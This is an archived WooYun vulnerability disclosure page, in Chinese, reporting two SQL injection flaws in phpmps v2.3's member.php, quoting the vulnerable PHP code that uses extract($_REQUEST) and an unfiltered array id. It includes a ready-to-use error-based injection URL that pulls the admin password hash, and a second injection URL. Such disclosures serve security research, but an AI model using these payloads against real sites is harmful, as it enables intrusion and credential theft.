@@ -1,0 +1,261 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpmps_v2.3最新版两处SQL注入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpmps_v2.3最新版两处SQL注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/My5t3ry">My5t3ry</a> 
+</li><li>提交时间：		2013-08-20 18:24</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-20：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-11-18：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">PHPMPS对用户提交的参数处理不当，导致多个SQL注入漏洞.</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">member.php 422 - 455 <br />
+<br />
+<br />
+<br />
+============================================================================================<br />
+<br />
+	case &#039;exchange&#039;:<br />
+<br />
+		$units = array(&#039;gold&#039;=&gt;&#039;枚&#039;, &#039;money&#039;=&gt;&#039;元&#039;, &#039;credit&#039;=&gt;&#039;分&#039;);<br />
+<br />
+		$types = array(&#039;money&#039;=&gt;&#039;资金&#039;, &#039;gold&#039;=&gt;&#039;信息币&#039;, &#039;credit&#039;=&gt;&#039;积分&#039;);<br />
+<br />
+		$notes = array(&#039;login&#039;=&gt;&#039;登陆积分&#039;, &#039;post_info_credit&#039;=&gt;&#039;发布信息积分&#039; ,&#039;post_comment_credit&#039;=&gt;&#039;发布评论积分&#039; ,&#039;info_refer&#039;=&gt;&#039;一键更新信息&#039; ,&#039;info_top&#039;=&gt;&#039;信息置顶&#039; , &#039;credit2gold&#039;=&gt;&#039;积分兑换信息币&#039;, &#039;money2gold&#039;=&gt;&#039;资金购买信息币&#039;);<br />
+<br />
+		extract($_REQUEST);<br />
+<br />
+		$page = isset($page) ? intval($page) : 1;<br />
+<br />
+		$pagesize = 20;<br />
+<br />
+<br />
+<br />
+		$sql = &#039;&#039;;<br />
+<br />
+		if($type) $sql .= &quot; AND type=&#039;$type&#039; &quot;;<br />
+<br />
+		if($begindate) {<br />
+<br />
+			$begintime = strtotime($begindate.&#039; 00:00:00&#039;);<br />
+<br />
+			$sql .= &quot; AND addtime&gt;=$begintime &quot;;<br />
+<br />
+		}<br />
+<br />
+		if($enddate) {<br />
+<br />
+			$endtime = strtotime($enddate.&#039; 23:59:59&#039;);<br />
+<br />
+			$sql .= &quot; AND addtime&lt;=$endtime&quot;;<br />
+<br />
+		}<br />
+<br />
+		$r = $db-&gt;getOne(&quot;SELECT count(*) as number FROM {$table}pay_exchange WHERE username=&#039;$_username&#039; $sql&quot;);<br />
+<br />
+		$pager[&#039;search&#039;] = array(&#039;act&#039; =&gt; &#039;exchange&#039;);<br />
+<br />
+		$pager = get_pager(&#039;member.php&#039;, $pager[&#039;search&#039;], $r, $page, $pagesize);<br />
+<br />
+<br />
+<br />
+		$exchanges = array();<br />
+<br />
+		$result = $db-&gt;query(&quot;SELECT * FROM {$table}pay_exchange WHERE username=&#039;$_username&#039; $sql ORDER BY exchangeid DESC LIMIT $pager[start],$pager[size]&quot;);<br />
+<br />
+		while($r = $db-&gt;fetchrow($result)) {<br />
+<br />
+			$r[&#039;unit&#039;] = $units[$r[&#039;type&#039;]];<br />
+<br />
+			$r[&#039;type&#039;] = $types[$r[&#039;type&#039;]];<br />
+<br />
+			$r[&#039;note&#039;] = !empty($notes[$r[&#039;note&#039;]]) ? $notes[$r[&#039;note&#039;]] : $r[&#039;note&#039;];<br />
+<br />
+			$r[&#039;addtime&#039;] = date(&#039;Y-m-d h:i:s&#039;, $r[&#039;addtime&#039;]);<br />
+<br />
+			$exchanges[] = $r;<br />
+<br />
+		}<br />
+<br />
+		$seo[&#039;title&#039;] = &#039;交易详情&#039;;<br />
+<br />
+		include template(&#039;member_exchange&#039;);<br />
+<br />
+	break;<br />
+<br />
+<br />
+<br />
+============================================================================================<br />
+<br />
+上面的代码使用了extract($_REQUEST);<br />
+<br />
+导致我们可以覆盖任意变量，通过覆盖变量$table可以构造注入<br />
+<br />
+利用如下：<br />
+<br />
+http://192.168.116.128/phpmps/member.php?act=check_info_gold&amp;table=phpmps_member%20where%201=1%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%28select%20password%20from%20phpmps_admin%20limit%200,1%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23<br />
+<br />
+<br />
+<br />
+SQL漏洞2：<br />
+<br />
+============================================================================================<br />
+<br />
+member.php 741 - 746 SQL   http://192.168.116.128/phpmps/member.php?act=delete&amp;id[]=1a<br />
+<br />
+============================================================================================<br />
+<br />
+	case &#039;delete&#039;:<br />
+<br />
+		$id = is_array($_REQUEST[&#039;id&#039;]) ? join(&#039;,&#039;, $_REQUEST[&#039;id&#039;]) : intval($_REQUEST[&#039;id&#039;]);<br />
+<br />
+		if(empty($id))showmsg(&#039;没有选择记录&#039;);<br />
+<br />
+		$db-&gt;query(&quot;DELETE FROM {$table}comment WHERE id IN ($id)&quot;);<br />
+<br />
+		showmsg(&#039;删除成功&#039;, &#039;member.php?act=info_comment&#039;);<br />
+<br />
+	break;<br />
+<br />
+============================================================================================<br />
+<br />
+<br />
+<br />
+这里没有考虑$id为数组的情况，当提交数组的时候可以注入。<br />
+<br />
+如： http://192.168.116.128/phpmps/member.php?act=delete&amp;id[]=1a </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤。。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/My5t3ry" title="My5t3ry">My5t3ry</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-034617" title="phpmps_v2.3最新版两处SQL注入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="34617";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
